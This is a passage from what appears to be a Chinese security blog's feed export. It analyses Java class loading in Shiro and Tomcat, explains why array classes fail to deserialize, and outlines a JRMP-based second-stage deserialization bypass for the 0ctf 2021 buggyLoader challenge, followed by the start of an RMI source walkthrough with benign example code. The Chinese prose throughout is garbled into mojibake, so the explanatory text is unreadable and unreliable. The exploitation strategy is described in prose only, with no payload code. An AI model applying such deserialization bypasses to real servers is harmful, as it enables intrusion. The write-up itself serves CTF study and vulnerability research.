class_">ClassNotFoundException</span>(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°åœ¨è¿™é‡Œå°†å…¨ç±»åè½¬æˆäº†&#x2F;a&#x2F;b&#x2F;c.classå½¢å¼ï¼Œç„¶åè°ƒç”¨defineClasså»åŠ è½½ç±»æ–‡ä»¶ã€‚é‚£ä¹ˆè¿™é‡Œå®é™…ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆå¸¸ç”¨çš„ClassLoader.getSystemClassLoader().loadClassæ— æ³•åŠ è½½æ•°ç»„ï¼Œå› ä¸ºæ•°ç»„ç±»çš„Classåç§°åˆå¸¦æ‹¬å·åˆå¸¦åˆ†å·çš„ï¼Œæ¯”å¦‚<code>[Lorg.apache.commons.collections.Transformer;</code>ï¼Œè‚¯å®šå¯¹åº”ä¸ä¸Šæ–‡ä»¶ã€‚</p><p>å³URLClassLoaderä¸èƒ½åŠ è½½æ•°ç»„ç±»</p><h2 id="shiro-ä¸­çš„loadClass"><a href="#shiro-ä¸­çš„loadClass" class="headerlink" title="shiro ä¸­çš„loadClass"></a>shiro ä¸­çš„loadClass</h2><p>å½“æ—¶Shiroçš„æŠ¥é”™ä¿¡æ¯é‡Œæœ‰<code>[Lorg.apache.commons.collections.Transformer;</code></p><blockquote><p>[Læ˜¯ä¸€ä¸ªJVMçš„æ ‡è®°ï¼Œè¯´æ˜å®é™…ä¸Šè¿™æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå³Transformer[]</p></blockquote><p>shiroçš„æ¼æ´ç‚¹DefaultSerializar.deserializeï¼Œåœ¨readObjectå‰ï¼Œç”¨è‡ªå®šä¹‰çš„ClassResolvingObjectInputStreamè§£æäº†è¾“å…¥æµï¼Œè€Œä¸æ˜¯ç”¨é»˜è®¤çš„ObjectInputStream</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922203138768.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922203138768.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¯¥ç±»resolveClassç”¨è‡ªå®šä¹‰çš„forNameæŸ¥æ‰¾ç±»ï¼Œè€Œä¸æ˜¯Class.forName</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922203248779.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922203248779.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>resolveClass æ˜¯ååºåˆ—åŒ–ä¸­ç”¨æ¥æŸ¥æ‰¾ç±»çš„æ–¹æ³•ã€‚è¯»å–åºåˆ—åŒ–æµçš„æ—¶å€™ï¼Œè¯»åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²å½¢å¼çš„ç±»åï¼Œéœ€è¦é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥æ‰¾åˆ°å¯¹åº”çš„å¯¹è±¡ã€‚</p></blockquote><p>è°ƒç”¨äº†è¿™ä»€ä¹ˆé™æ€å˜é‡çš„loadClass</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922203633004.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922203633004.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¹Ÿå°±æ˜¯ExceptionIgnoringAccessor.loadClass</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922203708443.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922203708443.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…ˆgetClassLoaderè·å–ç±»åŠ è½½å™¨ï¼Œç„¶åè°ƒç”¨è¯¥ç±»åŠ è½½å™¨çš„loadClass</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922203835867.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922203835867.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¸åŒä¸­é—´ä»¶çš„ç±»åŠ è½½å™¨ä¸åŒï¼ŒTomcatä¸­æ˜¯ParallelWebappClassLoader</p><p>ç½‘ä¸Šä¸‹ä¸ªTomcat 8.5.6æºç åˆ†æä¸€ä¸‹</p><p>ParallelWebappClassLoaderç»§æ‰¿WebappClassLoaderBaseï¼Œä¸”æœªé‡å†™loadClassï¼Œé‚£å°±çœ‹WebappClassLoaderBase.loadClass</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922204156808.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922204156808.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è‰ï¼Œè¿™ä¸ªä¹Ÿæ²¡é‡å†™ï¼Œæˆ‘TMè·Ÿè·Ÿè·Ÿ</p><p>æœ€åè·Ÿåˆ°WebappClassLoaderBaseï¼ŒæŒ–è‰ï¼Œå·´æ‹‰ä¸€ä¸²ï¼Œå¯ä»¥è¯»æ³¨é‡Šçš„è‹±æ–‡ï¼ˆå¾ˆå¿«ï¼Œåˆ«è¯»ï¼Œæˆ‘ç›´æ¥æŠ„ç»“è®º</p><p>1ã€å…ˆåœ¨tomcatçš„ç¼“å­˜ä¸­æŸ¥æ‰¾è¯¥ç±»æ˜¯å¦å·²ç»åŠ è½½è¿‡<br>2ã€å¦‚æœæ²¡æœ‰ï¼Œåœ¨jdkçš„ç¼“å­˜é‡ŒæŸ¥æ‰¾è¯¥ç±»æ˜¯å¦å·²ç»åŠ è½½è¿‡<br>3ã€å¦‚æœæ²¡æœ‰ï¼Œåˆ™ä½¿ç”¨ExtClassLoader#loadClassåŠ è½½ï¼ŒExtClassLoaderä¼šèµ°åŒäº²å§”æ´¾ã€‚è¿™é‡Œæ˜¯ä¸ºäº†åœ¨æ‰“ç ´åŒäº²å§”æ´¾çš„åŒæ—¶ä¿ç•™åŠ è½½ç³»ç»Ÿå†…ç½®ç±»çš„åŠŸèƒ½ï¼Œç»•è¿‡AppClassLoaderã€‚<br>4ã€å¦‚æœæ²¡æœ‰åŠ è½½æˆåŠŸï¼Œåˆ¤æ–­æ˜¯å¦è®¾ç½®äº†delegateä¹Ÿå°±æ˜¯éµå¾ªåŒäº²å§”æ´¾ï¼Œé»˜è®¤æ˜¯falseï¼Œå°±ä¼šè°ƒç”¨WebAppClassLoader#findClassæ–¹æ³•è¿›è¡ŒåŠ è½½ã€‚<br>5ã€å¦‚æœæ²¡æœ‰åŠ è½½æˆåŠŸï¼Œä¼šç”¨çˆ¶ç±»åŠ è½½å™¨è°ƒç”¨Class#forNameè¿›è¡ŒåŠ è½½ï¼Œä¹Ÿå°±æ˜¯ç”¨tomcatä¸­çš„CommonClassLoaderã€‚</p><p>delegateLoadä¸ºfalseï¼Œèƒ½è¿›ifã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922223036102.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922223036102.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp">å¯ä»¥çœ‹åˆ°åœ¨è¿™ä¸ªè¿‡ç¨‹é‡Œï¼Œå®é™…ä¸Šæ˜¯æ—¢æœ‰Class#forNameåˆæœ‰ClassLoader#loadClassçš„ã€‚åŠ è½½ç±»çš„åœ°æ–¹å®é™…å°±ä¸¤ä¸ªWebAppClassLoader#findClasså’Œç”¨CommonClassLoaderè°ƒç”¨Class#forName</p><ul><li>findClassä¸ºä»€ä¹ˆæ²¡æœ‰åŠ è½½æˆåŠŸå‘¢ï¼Ÿ</li></ul><p>WebAppClassLoader#findClassè°ƒç”¨äº†findClassInternalï¼Œnameä¸€å¼€å§‹å°±ç»è¿‡äº†binaryNameToPath</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923110029463.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923110029463.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ¢æˆäº†å’ŒURLClassLoader#findClassç±»ä¼¼çš„æ”¹æˆ&#x2F;a&#x2F;b&#x2F;c.classå½¢å¼ï¼Œä¹Ÿä¸èƒ½åŠ è½½æ•°ç»„ç±»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923110051795.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240923110051795.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>CommonClassLoaderè°ƒç”¨Class#forNameä¸ºä»€ä¹ˆæ²¡æœ‰åŠ è½½æˆåŠŸå‘¢ï¼Ÿ</li></ul><p>Class.forNameå¯ä»¥åŠ è½½æ•°ç»„ç±»ï¼Œå› ä¸ºè¿›å»å°±å¤„ç†æˆæ­£å¸¸çš„Pathå†è¿›è¡Œçš„åŒäº²å§”æ´¾ç±»åŠ è½½</p><p>ä½†è¿™é‡Œä¼ å…¥çš„CommonClassLoaderæ˜¯ä¸€ä¸ªURLClassLoaderï¼Œå…¶ä¸­çš„URLåªæœ‰tomcat&#x2F;libä¸‹é¢çš„jaråŒ…ï¼ŒforNameè¿›è¡Œç±»åŠ è½½ä¼šéµå¾ªåŒäº²å§”æ´¾ï¼Œé…ç½®çš„ç±»åŠ è½½å™¨æ˜¯AppClassLoaderï¼Œä¹Ÿå°±æ˜¯AppClassLoaderå¯¹åº”çš„URLClassLoaderåŠåŒäº²å§”æ´¾å‘ä¸Šèµ°åˆ°çš„ExtClassLoaderï¼ˆä¹Ÿæ˜¯URLClassLoaderï¼ŒåªåŒ…æ‹¬tomcat&#x2F;libï¼‰ï¼ŒbootClassLoader Pathå¯¹åº”çš„ç±»éƒ½èƒ½åŠ è½½ï¼Œå…¶ä¸­å°±åŒ…æ‹¬JavaåŸç”Ÿç±»å’Œtomcat&#x2F;libä¸‹é¢çš„jarã€‚</p><p>å…¶ä»–çš„æ•°ç»„ç±»å› ä¸ºURLClassLoaderåªåŒ…æ‹¬tomcat&#x2F;libçš„åŸå› ï¼Œæ¯”å¦‚WEB-INF&#x2F;classeså’ŒWEB-INF&#x2F;libéƒ½åŠ è½½ä¸äº†</p><p>shiroè¿™é‡Œçš„loadClassï¼ŒClassLoaderåŠ è½½æ•°ç»„å› ä¸ºç±»åæ”¹ä¸ºäº†æ•°ç»„å½¢å¼ï¼Œåœ¨å‰é¢å‡ æ¬¡éƒ½æŸ¥æ‰¾ä¸åˆ°ï¼Œé”™å¤±è‰¯æœºã€‚èµ°åˆ°äº†Class.forNameï¼Œåœ¨Tomcatä½œä¸ºä¸­é—´ä»¶çš„æƒ…å†µä¸‹ï¼Œå´å› ä¸ºTomcatè‡ªå®šä¹‰åŒäº²å§”æ´¾çš„åŸå› ï¼ŒæŸ¥æ‰¾è·¯å¾„åˆæ²¡æœ‰æˆ‘ä»¬éœ€è¦çš„CCä¾èµ–</p><p>TomcatåŒäº²å§”æ´¾ä½ ä¸ªéª‡äººé²¸</p><blockquote><p>ç»“è®ºå°±æ˜¯ï¼ŒURLClassLoader.loadClassä¸èƒ½åŠ è½½æ•°ç»„ç±»ï¼ŒClass.forNameå¯ä»¥åŠ è½½æ•°ç»„ç±»ã€‚Shiroä¸­è‡ªå®šä¹‰äº†loadClassï¼Œåªèƒ½åŠ è½½Tomcat libå’ŒJAVAåŸç”Ÿæ•°ç»„ç±»</p></blockquote><h2 id="2021-0ctf-buggyLoader-loadClass"><a href="#2021-0ctf-buggyLoader-loadClass" class="headerlink" title="2021 0ctf buggyLoader loadClass"></a>2021 0ctf buggyLoader loadClass</h2><p>é¢˜ç›®æ¥è‡ª2021 è…¾è®¯0ctf buggyloaderã€‚é¢˜ç›®ç¯å¢ƒï¼š</p><p><a href="https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2021-final/buggyLoader">https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2021-final/buggyLoader</a></p><p>gitdownç›´æ¥ä¸‹è½½æ–‡ä»¶å¤¹</p><p><a href="http://tool.mkblog.cn/downgit">http://tool.mkblog.cn/downgit</a></p><p>é¢˜ç›®å¾ˆæ˜æ˜¾äº†ï¼Œç”¨CCé“¾æ‰“</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922212851740.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922212851740.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>springbooté¡¹ç›®ï¼Œç›´æ¥çœ‹Controller</p><p>IndexControllerè‡ªå·±å®šä¹‰äº†MyObjectInputStreamè§£æè¾“å…¥æµ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922212249180.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922212249180.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>resolveClassè°ƒç”¨loadClasså¯»æ‰¾ç±»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922212345117.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240922212345117.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ClassLoaderåœ¨æ„é€ å‡½æ•°ç»™å‡ºäº†ï¼ŒURLClassLoaderã€‚</p><p>URLClassLoader.loadClassä¸èƒ½åŠ è½½æ•°ç»„ç±»ã€‚</p><p>ä¸€ä¸ªæ•°ç»„ç±»ä¹Ÿä¸èƒ½ä¼ ï¼Œæ€ä¹ˆæ‰“CCï¼Ÿ</p><p>ç”¨åˆ°äº†æˆ‘ä»¬ä¸Šä¸€èŠ‚è®²çš„ï¼ŒJRMPã€‚åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´å¼€å¯RMIæœåŠ¡ï¼Œå†å‘RMIæ‰“CCé“¾ï¼Œå½¢æˆäºŒæ¬¡ååºåˆ—åŒ–</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> javaæ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç±»åŠ è½½ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RMIä¸‰ç«¯æºç åˆ†æ&amp;JRMPåŠå…¶é«˜ç‰ˆæœ¬ç»•è¿‡</title>
      <link href="/2024/09/20/rmi-san-duan-jrmp-ji-qi-gao-ban-ben-rao-guo/"/>
      <url>/2024/09/20/rmi-san-duan-jrmp-ji-qi-gao-ban-ben-rao-guo/</url>
      
        <content type="html"><![CDATA[<p>è¯´å®è¯æˆ‘æ¯æ¬¡çœ‹åˆ°RMIçš„æµç¨‹æˆ‘éƒ½è§‰å¾—è„‘è¢‹ç–¼ã€‚è€Œä¸”åˆ†æå®Œäº†éƒ½ä¸è®°å¾—åˆ†æäº†ä¸ªä»€ä¹ˆé¸Ÿã€‚</p><p>æˆ–è®¸è¿™æ¬¡ä¼šå¥½ä¸€ç‚¹ã€‚</p><h2 id="RMIè¿œç¨‹ç±»è°ƒç”¨"><a href="#RMIè¿œç¨‹ç±»è°ƒç”¨" class="headerlink" title="RMIè¿œç¨‹ç±»è°ƒç”¨"></a>RMIè¿œç¨‹ç±»è°ƒç”¨</h2><p>RMIçš„ä½œç”¨å°±æ˜¯å®¢æˆ·ç«¯è°ƒç”¨æœåŠ¡ç«¯çš„è¿œç¨‹ç±»ã€‚</p><p>æˆ‘ä»¬å¼€ä¸¤ä¸ªé¡¹ç›®ï¼Œä¸€ä¸ªåšå®¢æˆ·ç«¯ï¼Œä¸€ä¸ªåšæœåŠ¡ç«¯ã€‚ç”¨jdk8u65</p><h3 id="RMIServer"><a href="#RMIServer" class="headerlink" title="RMIServer"></a>RMIServer</h3><p>å®šä¹‰ä¸€ä¸ªç»§æ‰¿äº†Remoteçš„æ¥å£RemoteInterface</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªå®ç°è¯¥æ¥å£çš„ç±»RemoteImplï¼Œéœ€è¦ç»§æ‰¿UnicastRemoteObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteInterface</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RemoteImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello &quot;</span> + name);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>RemoteImplå¿…é¡»åŠ å…¥ä¸€ä¸ªè°ƒç”¨äº†çˆ¶ç±»æ„é€ å‡½æ•°çš„æ„é€ å‡½æ•°ã€‚</p><p>è¿™é‡Œçš„æ— å‚æ„é€ å‡½æ•°å®é™…ä¸Šä¼šè‡ªåŠ¨å‘ç¬¬ä¸€è¡Œæ’å…¥ä¸€æ¡éšå¼çš„<code>super()</code>ï¼Œå¦‚ä¸‹ã€‚è€Œä¸å†™æ„é€ å‡½æ•°æ˜¯è‡ªåŠ¨ç”Ÿæˆæ— å‚æ„é€ å‡½æ•°ï¼Œä¸æ»¡è¶³è°ƒç”¨<code>super(args...);</code>çš„è¦æ±‚ï¼Œæ‰€ä»¥æŠ¥é”™ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">protected</span> <span class="title function_">RemoteImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">   <span class="built_in">super</span>();</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure></blockquote><p>å‘å¤–å¼€æ”¾æœåŠ¡çš„RMIServerã€‚éœ€è¦LocateRegistry.createRegistry(1099)ï¼Œå¼€æ”¾æ³¨å†Œä¸­å¿ƒåˆ°1099ç«¯å£ã€‚å¹¶æŠŠç±»ç»‘å®šåˆ°æ³¨å†Œä¸­å¿ƒã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">RemoteInterface</span> <span class="variable">remoteImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteImpl</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;remoteImpl&quot;</span>, remoteImpl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="RMIClient"><a href="#RMIClient" class="headerlink" title="RMIClient"></a>RMIClient</h3><p>éœ€è¦ä¸€ä¸ªç›¸åŒçš„æ¥å£RemoteInterface</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æœåŠ¡ç«¯è¿œç¨‹ç±»çš„ï¼Œå®¢æˆ·ç«¯RMIClient</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">RemoteInterface</span> <span class="variable">remoteImpl</span> <span class="operator">=</span> (RemoteInterface) registry.lookup(<span class="string">&quot;remoteImpl&quot;</span>);</span><br><span class="line">        System.out.println(remoteImpl.sayHello(<span class="string">&quot;RMI&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆå¼€æœåŠ¡ç«¯ï¼Œå†å¼€å®¢æˆ·ç«¯ã€‚å®¢æˆ·ç«¯å°±èƒ½è°ƒç”¨åˆ°æœåŠ¡ç«¯ä¸Šçš„æ–¹æ³•sayHello</p><h2 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h2><p>ç§»æ­¥è§†é¢‘ï¼š</p><p><a href="https://www.bilibili.com/video/BV1L3411a7ax?p=1&vd_source=732f44595cd3e361ab78ff559f3c5ab5">https://www.bilibili.com/video/BV1L3411a7ax?p=1&amp;vd_source=732f44595cd3e361ab78ff559f3c5ab5</a></p><p>æ­¤å¤„æ¦‚è¿°+åªç»™åˆ©ç”¨ç‚¹å’Œåˆ©ç”¨æ–¹å¼ï¼Œå› ä¸ºåˆ†æäº†ä¹Ÿè®°ä¸ä½ã€‚æˆ‘ç›´æ¥å·å·åˆ†æï¼ŒæŒ‚ä¸Šæ¥æˆ‘è‡ªå·±éƒ½ä¸çœ‹ã€‚</p><p>å·ä¸ªåŒ…æµ†RMIé€šä¿¡è€å›¾</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/20210227013102-65c85794-7858-1.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/20210227013102-65c85794-7858-1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…ˆä»æœåŠ¡ç«¯å¼€å§‹</p><h3 id="æœåŠ¡ç«¯"><a href="#æœåŠ¡ç«¯" class="headerlink" title="æœåŠ¡ç«¯"></a>æœåŠ¡ç«¯</h3><h4 id="RemoteInterface-remoteImpl-new-RemoteImpl"><a href="#RemoteInterface-remoteImpl-new-RemoteImpl" class="headerlink" title="RemoteInterface remoteImpl = new RemoteImpl();"></a><code>RemoteInterface remoteImpl = new RemoteImpl();</code></h4><p>ä»UnicastServerRefä¸€è·¯è·Ÿåˆ°äº†TCPEndpoint.getLocalEndpointï¼Œè·å–äº†IP</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808174637721.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808174637721.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨UnicastServerRef.exportObjectå®Œæˆäº†åˆ›å»ºè¿œç¨‹å¯¹è±¡çš„ä¸»è¦é€»è¾‘ï¼Œå‰é¢éƒ½æ˜¯å±‚å±‚å°è£…ï¼Œæ²¡ä»€ä¹ˆå¥½çœ‹çš„ã€‚</p><p>ç”Ÿæˆäº†ä¸€ä¸ªstubå¹¶èµ‹å€¼ï¼Œè¿™æ˜¯æœåŠ¡ç«¯stub</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808175819215.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808175819215.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å®é™…ä¸Šï¼Œèµ‹å€¼è°ƒç”¨çš„Util.creatProxy()å†…éƒ¨ï¼Œå°±æ˜¯ç”Ÿæˆäº†ä¸€ä¸ªä»£ç†ç±»ã€‚ç­‰äºè¯´stubå°±æ˜¯ä¸ªä»£ç†ç±»ï¼Œå¦‚ä¸‹</p><p>handleræ¥è‡ªRemoteObjectInvocationHandlerï¼Œçœ‹åˆ°è¯¥ç±»æ»¡è¶³ä»£ç†handlerçš„è¦æ±‚ï¼Œç»§æ‰¿äº†InvocationHandler</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808180905120.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808180905120.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808181139454.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808181139454.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿˜è®°å¾—åŠ¨æ€ä»£ç†å—ï¼Œè°ƒç”¨ä»£ç†ç±»çš„æ–¹æ³•ä¼šè‡ªåŠ¨èµ°è¿›handlerçš„invokeæ–¹æ³•ï¼ˆè™½ç„¶è¿™é‡Œæ²¡è°ƒç”¨ï¼Œä½†æ˜¯ä¸ºåé¢ä½ ä½¿ç”¨sayHelloçš„æ—¶å€™åšäº†é“ºå«ï¼‰</p><p>è¿™é‡ŒRemoteObjectInvocationHandler.invokeå°±æ˜¯åŠ äº†ä¸ªåˆ¤æ–­çš„æ™®é€šinvokeæ‰§è¡Œæ–¹æ³•</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808181443160.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240808181443160.png" 